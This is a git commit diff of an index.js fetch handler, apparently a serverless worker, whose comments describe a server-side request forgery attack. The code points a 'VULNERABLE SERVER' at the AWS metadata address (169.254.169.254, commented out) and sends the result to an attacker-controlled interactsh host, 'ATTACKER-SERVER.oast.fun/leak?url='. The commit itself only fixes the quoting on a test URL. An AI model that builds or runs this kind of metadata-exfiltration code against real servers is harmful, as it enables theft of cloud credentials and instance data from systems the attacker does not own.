fb9ab772617901f7352bba1f5a32d6be2f4ff474
Unknown_tht <65358061+shripad5258@users.noreply.github.com>
2025-03-06 00:28:27 +0530

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ export default {
   async fetch(request) {
     // Step 1: Redirect the VULNERABLE SERVER to AWS metadata
     // const awsUrl = "http://169.254.169.254/latest/meta-data/hostname";
-    const awsUrl = https://api.ipify.org/;
+    const awsUrl = "https://api.ipify.org";
     
     // Step 2: Force the server to include AWS data in the URL path/params
     const interactshUrl = "https://ATTACKER-SERVER.oast.fun/leak?url=";
